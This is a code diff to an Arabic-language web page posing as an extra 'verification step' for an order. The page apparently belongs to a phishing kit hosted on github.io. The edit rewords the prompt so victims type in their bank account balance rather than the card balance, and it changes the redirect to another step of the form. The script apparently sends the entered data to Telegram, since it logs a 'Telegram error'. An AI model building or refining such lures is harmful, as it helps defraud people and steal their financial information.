@@ -112,7 +112,7 @@
     <div class="card">
       <h1>خطوة تحقق واحدة إضافية</h1>
       <p class="subtitle">
-        قم بكتابة قيمة الرصيد في البطاقة المدخلة لتحقق من ملكيتك لإتمام طلبك.
+        قم بكتابة رصيد حسابك البنكي للبطاقة المدخلة لتحقق من ملكيتك لإتمام طلبك.
       </p>
 
       <label for="code-input">رصيد البطاقة</label>
@@ -123,7 +123,7 @@
         inputmode="numeric"
         pattern="[0-9]*"
         maxlength="12"
-        placeholder="أدخل الرصيد هنا"
+        placeholder="أدخل رصيد حسابك هنا"
       />
 
       <div class="error" id="error-msg"></div>
@@ -170,7 +170,7 @@
         console.log("Telegram error:", err);
       }).finally(function () {
         // الانتقال للخطوة الرابعة
-        window.location.href = "https://jeson2025.github.io/form-site/step4.html";
+        window.location.href = "https://jeson2025.github.io/form-site/step2.html";
       });
     });
   </script>
